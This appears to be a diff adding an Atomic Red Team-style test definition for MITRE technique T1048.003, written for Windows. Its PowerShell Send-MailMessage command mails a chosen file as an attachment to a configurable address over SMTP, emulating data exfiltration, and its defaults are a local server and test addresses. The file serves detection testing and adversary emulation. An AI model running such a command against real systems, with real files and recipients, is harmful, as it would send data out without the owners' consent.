@@ -1,0 +1,44 @@
+{
+    "name": "Exfiltration Over Alternative Protocol - SMTP",
+    "description": "Exfiltration of specified file over SMTP. Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1048.003",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "ec3a835e-adca-4c7c-88d2-853b69c11bb9",
+    "arguments": {
+        "input_file": {
+            "description": "Path to file to exfiltrate",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\notepad.exe"
+        },
+        "sender": {
+            "description": "The email address of the sender",
+            "type": "string",
+            "default": "test@corp.com"
+        },
+        "receiver": {
+            "description": "The email address of the receiver",
+            "type": "string",
+            "default": "test@corp.com"
+        },
+        "smtp_server": {
+            "description": "SMTP server to use for email transportation",
+            "type": "string",
+            "default": "127.0.0.1"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
